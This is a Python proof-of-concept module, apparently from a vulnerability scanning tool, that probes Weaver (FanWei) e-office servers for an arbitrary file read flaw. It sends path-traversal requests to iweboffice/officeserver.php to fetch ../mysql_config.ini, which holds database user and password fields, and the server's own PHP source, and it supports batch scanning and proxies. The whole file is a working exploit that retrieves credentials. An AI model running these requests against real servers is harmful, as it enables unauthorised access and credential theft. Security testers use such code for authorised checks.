# app="泛微-EOffice"
import requests,re,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Ecology_oa_file_read_Scan:
	def scan(self,baseurl):
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		if not self.batch:
			OutPrintInfo("FanWei", '执行POC-1...')
		try:
			url=baseurl+"iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini"
			response=requests.get(url,headers=self.headers,timeout=5,verify=self.ssl,proxies=self.proxy)
			if response.status_code == 200 and "datauser" in response.text and "datapassword" in response.text and "dataname" in response.text:
				OutPrintInfoSuc("FanWei", f'存在FanWei任意文件读取 {url}')
				if self.batch:
					OutPutFile("ecology_oa_file_read.txt",f'存在FanWei任意文件读取 {url}')
			else:
				if not self.batch:
					OutPrintInfo("FanWei", '不存在FanWei任意文件读取')
		except:
			if not self.batch:
				OutPrintInfo("FanWei", '目标请求出错')
		if not self.batch:
			OutPrintInfo("FanWei", '执行POC-2...')
		try:
			url=baseurl+"iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../iweboffice/officeserver.php"
			response=requests.get(url,headers=self.headers,timeout=5,verify=self.ssl,proxies=self.proxy)
			if response.status_code == 200 and '<?php' in response.text:
				OutPrintInfoSuc("FanWei", f'存在FanWei任意文件读取 {url}')
				if self.batch:
					OutPutFile("ecology_oa_file_read.txt", f'存在FanWei任意文件读取 {url}')
			else:
				if not self.batch:
					OutPrintInfo("FanWei", '不存在FanWei任意文件读取')
		except Exception:
			if not self.batch:
				OutPrintInfo("FanWei", '目标请求出错')

	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		header = target["header"]
		proxy = target["proxy"]
		self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("FanWei", '开始执行FanWei任意文件读取检测...')
		self.scan(url)
		if not self.batch:
			OutPrintInfo("FanWei", 'FanWei任意文件读取检测结束')
